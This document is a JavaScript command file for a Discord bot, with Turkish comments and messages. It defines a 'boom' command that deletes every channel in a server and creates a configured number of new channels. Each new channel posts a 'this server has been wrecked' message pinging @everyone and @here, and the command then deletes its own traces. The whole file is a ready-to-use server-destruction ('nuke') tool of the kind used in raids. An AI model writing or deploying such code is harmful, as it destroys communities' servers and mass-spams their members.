const fs = require('fs');
const path = require('path');
const ayarlarPath = path.join(__dirname, '../ayarlar.json');

module.exports = {
    name: 'boom',
    description: 'Sunucudaki tüm kanalları siler ve belirli sayıda belirtilen isimde metin kanalı oluşturur.',
    async execute(message, args) {
        try {
            const ayarlar = JSON.parse(fs.readFileSync(ayarlarPath, 'utf8'));
            const { botSahibiID, boomKanalIsmi, boomKanalSayisi } = ayarlar;

            if (message.author.id !== botSahibiID) {
                return message.reply('Bu komutu kullanmak için bot sahibi olmalısınız.');
            }

            // Sunucudaki tüm kanalları sil
            const channels = message.guild.channels.cache.array();
            for (const channel of channels) {
                await channel.delete();
            }

            // Belirtilen sayıda metin kanalı oluştur
            for (let i = 1; i <= boomKanalSayisi; i++) {
                const channelName = `${boomKanalIsmi}`;
                const newChannel = await message.guild.channels.create(channelName, { type: 'text' });
                await newChannel.send(`BU SUNUCU ÇATIR ÇUTUR YENİLMİŞTİR! @everyone @here`);
            }

            // Bilgilendirme mesajı gönder ve 5 saniye sonra sil
            const confirmMessage = await message.channel.send('Sunucudaki kanallar silindi, belirli sayıda yeni kanal oluşturuldu!');
            setTimeout(() => confirmMessage.delete(), 5000);

            // Komut mesajını 5 saniye sonra sil
            setTimeout(() => message.delete(), 5000);
        } catch (error) {
            console.error('Hata oluştu:', error);
            message.reply('Bir hata oluştu, işlem gerçekleştirilemedi.');
        }
    },
};
